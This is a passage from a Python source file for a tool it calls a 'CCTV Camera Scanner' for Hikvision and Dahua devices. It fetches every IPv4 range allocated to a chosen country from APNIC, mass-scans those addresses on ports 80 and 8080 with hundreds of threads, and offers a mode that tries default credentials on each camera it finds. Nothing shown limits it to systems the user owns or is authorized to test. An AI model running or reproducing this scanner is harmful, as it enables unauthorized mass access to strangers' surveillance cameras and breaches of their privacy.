            if len(parts) >= 7 and parts[1].upper() == country_code.upper() and parts[2].lower() == 'ipv4':
                start_ip = parts[3]
                count = int(parts[4])
                ipv4_list.append(f"{start_ip}/{count}")
                
                # Show progress every 5 entries
                if len(ipv4_list) % 5 == 0:
                    sys.stdout.write(f"\r{Fore.CYAN}[→] Found {len(ipv4_list)} {country_code} IPv4 ranges...{Style.RESET_ALL}")
                    sys.stdout.flush()
            
            line_count += 1
        
        print(f"\n{Fore.GREEN}[✓] Processing complete! Scanned {line_count} lines{Style.RESET_ALL}")
        
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[!] Error: Connection timeout{Style.RESET_ALL}")
        return []
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Network error: {e}{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error: {e}{Style.RESET_ALL}")
        return []
    
    return ipv4_list


def save_ip_ranges_to_file(ipv4_list: List[str], file_path: str) -> bool:
    """Save IPv4 ranges to file"""
    if not ipv4_list:
        print(f"{Fore.RED}[!] No data to save{Style.RESET_ALL}")
        return False
    
    try:
        print(f"\n{Fore.YELLOW}[*] Saving to {file_path}...{Style.RESET_ALL}")
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(ipv4_list))
        
        print(f"{Fore.GREEN}[✓] Successfully saved {len(ipv4_list)} ranges{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[i] File location: {file_path}{Style.RESET_ALL}")
        return True
        
    except IOError as e:
        print(f"{Fore.RED}[!] File error: {e}{Style.RESET_ALL}")
        return False


def load_country_ip_ranges(country_file: str, country_code: str = None, auto_fetch: bool = True) -> List[str]:
    """Load IP ranges from country file. Auto-fetches from APNIC if file doesn't exist."""
    try:
        # Try script directory first, then current directory
        script_path = os.path.join(SCRIPT_DIR, country_file)
        current_path = os.path.abspath(country_file)
        
        # Determine which path to use
        file_path = None
        if os.path.exists(script_path):
            file_path = script_path
        elif os.path.exists(current_path):
            file_path = current_path
        elif os.path.exists(country_file):
            file_path = country_file
        
        # If file doesn't exist and auto_fetch is enabled, fetch from APNIC
        if not file_path and auto_fetch and country_code:
            print(f"{Fore.YELLOW}[!] File not found: {country_file}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Auto-fetching IP ranges from APNIC...{Style.RESET_ALL}\n")
            
            # Fetch from APNIC
            ipv4_list = fetch_country_ipv4_from_apnic(country_code)
            
            if ipv4_list:
                # Save to script directory
                file_path = script_path
                if save_ip_ranges_to_file(ipv4_list, file_path):
                    print(f"{Fore.GREEN}[✓] IP ranges saved successfully!{Style.RESET_ALL}\n")
                    return ipv4_list
                else:
                    return []
            else:
                print(f"{Fore.RED}[!] Failed to fetch IP ranges from APNIC{Style.RESET_ALL}")
                return []
        
        # If file still doesn't exist, show error
        if not file_path:
            print(f"{Fore.RED}[!] File not found: {country_file}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Checked paths:{Style.RESET_ALL}")
            print(f"    - Script directory: {script_path}")
            print(f"    - Current directory: {current_path}")
            print(f"    - Relative path: {country_file}")
            if country_code:
                print(f"{Fore.CYAN}[i] Tip: The file will be auto-generated on first use{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[*] Please make sure the country IP file exists.{Style.RESET_ALL}")
            return []
        
        # Load from existing file
        with open(file_path, 'r', encoding='utf-8') as f:
            ranges = [line.strip() for line in f if line.strip()]
        
        if ranges:
            print(f"{Fore.GREEN}[✓] Loaded {len(ranges)} IP ranges from: {file_path}{Style.RESET_ALL}")
        
        return ranges
    except Exception as e:
        print(f"{Fore.RED}[!] Error reading file {country_file}: {e}{Style.RESET_ALL}")
        return []


def scan_country_cameras_detection_only(country: dict, max_workers: int = None):
    """
    Phase 1: Fast camera detection only (no login) - Save to txt
    """
    global total_ips, scanned_count, valid_results, start_time, cctv_output_file, found_count, rejected_count
    
    # Initialize counters
    found_count = 0
    rejected_count = 0
    
    country_file = country['file']
    # Use script directory for output file
    cctv_output_file = os.path.join(SCRIPT_DIR, f"{country['code']}_CCTV_Found.txt")
    
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Random Camera Scan - Detection Only{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Country: {country['name']} ({country['code']}){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] IP File: {country_file}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Output File: {cctv_output_file}{Style.RESET_ALL}\n")
    
    # Load IP ranges (auto-fetch from APNIC if file doesn't exist)
    ip_ranges = load_country_ip_ranges(country_file, country_code=country['code'], auto_fetch=True)
    if not ip_ranges:
        print(f"{Fore.RED}[!] No IP ranges loaded. Exiting...{Style.RESET_ALL}")
        return
    
    print()  # Extra line for better formatting
    
    print(f"{Fore.YELLOW}[*] Converting IP ranges to individual IPs...{Style.RESET_ALL}")
    
    # Convert CIDR ranges to individual IPs
    ip_list = []
    for idx, cidr_range in enumerate(ip_ranges, 1):
        ips = cidr_to_ip_range(cidr_range)
        ip_list.extend(ips)
        if idx % 100 == 0:
            print(f"\r{Fore.CYAN}[*] Processed {idx}/{len(ip_ranges)} ranges, {len(ip_list)} IPs...{Style.RESET_ALL}", end='', flush=True)
    
    print(f"\n{Fore.GREEN}[✓] Total IPs to scan: {len(ip_list)}{Style.RESET_ALL}\n")
    
    if not ip_list:
        print(f"{Fore.RED}[!] No IPs to scan!{Style.RESET_ALL}")
        return
    
    total_ips = len(ip_list)
    ports_to_scan = [80, 8080]  # Most common camera ports
    
    # Auto-detect CPU cores
    if max_workers is None:
        try:
            cpu_count = os.cpu_count() or 4
            max_workers = min(cpu_count * 10, 500)
        except:
            max_workers = 300
    
    print(f"{Fore.CYAN}[*] Scanning {total_ips} IPs with {max_workers} threads (FAST DETECTION MODE){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Ports to scan: {', '.join(map(str, ports_to_scan))}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Mode: Detection Only - No Login Attempts{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Scanning... Press Ctrl+C to stop{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    valid_results.clear()
    scanned_count = 0
    
    # Clear output file
    try:
        if os.path.exists(cctv_output_file):
            os.remove(cctv_output_file)
    except:
        pass
    
    # Use ThreadPoolExecutor for parallel scanning (detection only)
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all IP scanning tasks
        future_to_ip = {
            executor.submit(scan_single_ip_detection_only, ip, ports_to_scan): ip 
            for ip in ip_list
        }
        
        # Process results as they complete
        for future in as_completed(future_to_ip):
            try:
                result = future.result()
                if result:
                    with results_lock:
                        valid_results.append(result)
            except Exception:
                pass
    
    # Print summary with all counts
    elapsed = time.time() - start_time
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📊 SCAN COMPLETE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"    Total IPs scanned: {Fore.YELLOW}{scanned_count}{Style.RESET_ALL}")
    print(f"    Total IPs rejected: {Fore.RED}{rejected_count}{Style.RESET_ALL}")
    print(f"    Total Cameras Found: {Fore.GREEN}{found_count}{Style.RESET_ALL}")
    print(f"    Time elapsed: {Fore.YELLOW}{elapsed:.2f} seconds{Style.RESET_ALL}")
    if elapsed > 0:
        print(f"    Scan speed: {Fore.YELLOW}{scanned_count/elapsed:.1f} IP/s{Style.RESET_ALL}")
    print(f"    Results saved to: {Fore.YELLOW}{cctv_output_file}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}[*] Next step: Use option 2 to try login on saved cameras{Style.RESET_ALL}\n")


def scan_country_cameras(country: dict, credentials: List[Tuple[str, str]], max_workers: int = None):
    """
    Scan country IP ranges for cameras (fast find then try login)
    """
    global total_ips, scanned_count, valid_results, start_time, cctv_output_file, found_count, rejected_count, login_success_count
    
    # Initialize counters
    found_count = 0
    rejected_count = 0
    login_success_count = 0
    
    country_file = country['file']
    # Use script directory for output file
    cctv_output_file = os.path.join(SCRIPT_DIR, f"{country['code']}_CCTV_Found.txt")
    
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Random Camera Scan - Detection + Login{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Country: {country['name']} ({country['code']}){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] IP File: {country_file}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Output File: {cctv_output_file}{Style.RESET_ALL}\n")
    
    # Load IP ranges (auto-fetch from APNIC if file doesn't exist)
    ip_ranges = load_country_ip_ranges(country_file, country_code=country['code'], auto_fetch=True)
    if not ip_ranges:
        print(f"{Fore.RED}[!] No IP ranges loaded. Exiting...{Style.RESET_ALL}")
        return
    
    print()  # Extra line for better formatting
    
    print(f"{Fore.YELLOW}[*] Converting IP ranges to individual IPs...{Style.RESET_ALL}")
    
    # Convert CIDR ranges to individual IPs
    ip_list = []
    for idx, cidr_range in enumerate(ip_ranges, 1):
        ips = cidr_to_ip_range(cidr_range)
        ip_list.extend(ips)
        if idx % 100 == 0:
            print(f"\r{Fore.CYAN}[*] Processed {idx}/{len(ip_ranges)} ranges, {len(ip_list)} IPs...{Style.RESET_ALL}", end='', flush=True)
    
    print(f"\n{Fore.GREEN}[✓] Total IPs to scan: {len(ip_list)}{Style.RESET_ALL}\n")
    
    if not ip_list:
        print(f"{Fore.RED}[!] No IPs to scan!{Style.RESET_ALL}")
        return
    
    total_ips = len(ip_list)
    ports_to_scan = [80, 8080]  # Most common camera ports
    
    # Auto-detect CPU cores
    if max_workers is None:
        try:
            cpu_count = os.cpu_count() or 4
            max_workers = min(cpu_count * 10, 500)
        except:
            max_workers = 300
    
    print(f"{Fore.CYAN}[*] Scanning {total_ips} IPs with {max_workers} threads (FAST MODE){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Ports to scan: {', '.join(map(str, ports_to_scan))}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Mode: Fast Camera Detection → Login Attempt{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Scanning... Press Ctrl+C to stop{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    valid_results.clear()
    scanned_count = 0
    
    # Clear output file
    try:
        if os.path.exists(cctv_output_file):
            os.remove(cctv_output_file)
    except:
        pass
    
    # Use ThreadPoolExecutor for parallel scanning
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all IP scanning tasks
        future_to_ip = {
            executor.submit(scan_single_ip_with_detection, ip, credentials, ports_to_scan): ip 
            for ip in ip_list
        }
        
        # Process results as they complete
        for future in as_completed(future_to_ip):
            try:
                result = future.result()
                # Results are already handled in scan_single_ip_with_detection
            except Exception:
                pass
    
    # Print summary with all counts
    elapsed = time.time() - start_time
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📊 SCAN COMPLETE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"    Total IPs scanned: {Fore.YELLOW}{scanned_count}{Style.RESET_ALL}")
    print(f"    Total IPs rejected: {Fore.RED}{rejected_count}{Style.RESET_ALL}")
    print(f"    Total Cameras Detected: {Fore.GREEN}{found_count}{Style.RESET_ALL}")
    print(f"    Total Login Success: {Fore.GREEN}{login_success_count}{Style.RESET_ALL}")
    print(f"    Time elapsed: {Fore.YELLOW}{elapsed:.2f} seconds{Style.RESET_ALL}")
    if elapsed > 0:
        print(f"    Scan speed: {Fore.YELLOW}{scanned_count/elapsed:.1f} IP/s{Style.RESET_ALL}")
    print(f"    Results saved to: {Fore.YELLOW}{cctv_output_file}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def get_public_ip():
    """Get the public IP address"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except Exception as e:
        return "Unknown"


def get_country(ip):
    """Get the country based on IP address"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get('country', 'Unknown')
        else:
            return "Unknown"
    except Exception as e:
        return "Unknown"


def print_banner():
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}        CCTV Camera Scanner - Hikvision & Dahua/Anjhua{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Developed by: {Fore.YELLOW}Charlie{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Supports: {Fore.YELLOW}Hikvision & Dahua/Anjhua Cameras{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def main():
    """Main function with menu"""
    global start_time, scanned_count, total_ips, valid_results
    
    # Print banner
    print_banner()
    
    # Display system info
    try:
        public_ip = get_public_ip()
        country = get_country(public_ip)
        timestamp = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Your IP: {Fore.YELLOW}{public_ip}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Country: {Fore.YELLOW}{country}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[i]{Style.RESET_ALL} Time: {Fore.YELLOW}{timestamp}{Style.RESET_ALL}")
    except:
        pass
    
    # Print menu
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Main Menu:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Random Camera Scan")
    print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Login Check from Saved TXT File")
    print(f"{Fore.YELLOW}3.{Style.RESET_ALL} IP Range Scan")
    print(f"{Fore.YELLOW}4.{Style.RESET_ALL} View All Valid Camera")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.GREEN}Enter your choice (1-4):{Style.RESET_ALL} ").strip()
    
    if choice == '1':
        # Random Camera Scan
        print_country_menu()
        
        while True:
            country_choice = input(f"{Fore.GREEN}Enter country number (1-{len(COUNTRIES)}):{Style.RESET_ALL} ").strip()
            
            if country_choice in COUNTRIES:
                selected_country = COUNTRIES[country_choice]
                print(f"\n{Fore.GREEN}[✓] Selected: {Fore.YELLOW}{selected_country['name']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[i] Country Code: {selected_country['code']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[i] IP File: {selected_country['file']}{Style.RESET_ALL}\n")
                
                # Ask if user wants to try login or just detect
                print(f"{Fore.CYAN}[*] Select scan mode:{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}1.{Style.RESET_ALL} Detection Only (Fast)")
                print(f"  {Fore.YELLOW}2.{Style.RESET_ALL} Detection + Login Attempt")
                
                mode_choice = input(f"{Fore.GREEN}Enter mode (1-2):{Style.RESET_ALL} ").strip()
                
                if mode_choice == '2':
                    scan_country_cameras(selected_country, DEFAULT_CREDENTIALS)
                else:
                    scan_country_cameras_detection_only(selected_country)
                break
            else:
                print(f"{Fore.RED}[!] Invalid choice. Please select 1-{len(COUNTRIES)}.{Style.RESET_ALL}")
    
    elif choice == '2':
        print(f"{Fore.YELLOW}[*] Login Check from Saved TXT File - Coming Soon{Style.RESET_ALL}")
    
    elif choice == '3':
        # IP Range input
        start_ip = input(f"{Fore.GREEN}[*] Enter Start IP:{Style.RESET_ALL} ").strip()
        if not start_ip:
            print(f"{Fore.RED}[!] Start IP is required!{Style.RESET_ALL}")
            sys.exit(1)
        
        end_ip = input(f"{Fore.GREEN}[*] Enter End IP:{Style.RESET_ALL} ").strip()
        if not end_ip:
            print(f"{Fore.RED}[!] End IP is required!{Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"{Fore.YELLOW}[*] IP Range Scan - Coming Soon{Style.RESET_ALL}")
    
    elif choice == '4':
        print(f"{Fore.YELLOW}[*] View All Valid Camera - Coming Soon{Style.RESET_ALL}")
        
    else:
        print(f"{Fore.RED}[!] Invalid choice!{Style.RESET_ALL}")
        sys.exit(1)
    
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)
